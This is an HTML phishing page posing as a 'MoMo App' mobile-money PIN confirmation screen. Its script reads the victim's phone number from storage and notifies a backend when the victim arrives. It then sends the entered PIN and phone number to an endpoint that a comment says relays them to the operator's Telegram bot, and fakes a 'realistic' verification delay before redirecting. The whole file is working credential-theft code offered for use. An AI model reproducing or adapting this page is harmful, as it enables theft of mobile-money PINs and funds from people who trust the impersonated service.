<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MoMo PIN</title>

<style>
body {
  margin: 0;
  font-family: Arial;
  background: #0b5c6b;
  color: white;
  text-align: center;
}

.header {
  background: #0b5c6b;
  color: #ffcc00;
  padding: 15px;
  font-size: 20px;
  font-weight: bold;
}

.container {
  background: white;
  color: black;
  max-width: 350px;
  margin: 40px auto;
  padding: 25px;
  border-radius: 15px;
  display: block; /* Shown immediately now */
}

input {
  width: 100%;
  padding: 15px;
  margin-top: 15px;
  border-radius: 10px;
  border: none;
  background: #f1f1f1;
  text-align: center;
  font-size: 18px;
  letter-spacing: 5px;
}

button {
  width: 100%;
  padding: 15px;
  margin-top: 20px;
  background: #ffcc00;
  border: none;
  border-radius: 10px;
  font-weight: bold;
  cursor: pointer;
}

.footer {
  margin-top: 20px;
  font-size: 12px;
}

.status {
  display: none; /* Hidden because we are already approved */
}
</style>
</head>

<body>

<div class="header">
  MoMo App
</div>

<div class="container" id="pinContainer">
  <h3>Enter MoMo PIN</h3>
  <p id="phoneDisplay"></p>

  <form id="pinForm">
    <!-- Changed type to number or text for easier input, kept placeholder -->
    <input type="password" id="pinInput" placeholder="****" maxlength="5" pattern="\d*" inputmode="numeric" required>
    <button type="submit" id="pinBtn">Confirm</button>
  </form>
</div>

<div class="footer">
  2026@MoMo Verified
</div>

<script>
// 1. Get phone from storage
const phone = localStorage.getItem("phone");

// 2. Security: If no phone, go back to start
if (!phone) {
  window.location.href = "/";
} else {
  document.getElementById("phoneDisplay").innerText = "Number: " + phone;
}

// 3. Notify Telegram that the user has reached the PIN page
fetch("/pin-step", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ phone })
}).catch(err => console.log("Step notification failed"));

// 4. Handle PIN Submission
document.getElementById("pinForm").addEventListener("submit", async function(e) {
  e.preventDefault();

  const pinValue = document.getElementById("pinInput").value;
  const btn = document.getElementById("pinBtn");

  // Visual feedback
  btn.innerText = "Verifying...";
  btn.disabled = true;

  try {
    // SEND THE PIN TO YOUR TELEGRAM BOT VIA BACKEND
    const response = await fetch("/send-pin", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ 
        phone: phone, 
        pin: pinValue 
      })
    });

    if (response.ok) {
      // Small delay for realistic feel
      setTimeout(() => {
        window.location.href = "/success.html";
      }, 2000);
    } else {
      throw new Error("Failed to send");
    }

  } catch (err) {
    alert("System busy. Please try again.");
    btn.innerText = "Confirm";
    btn.disabled = false;
  }
});
</script>

</body>
</html>
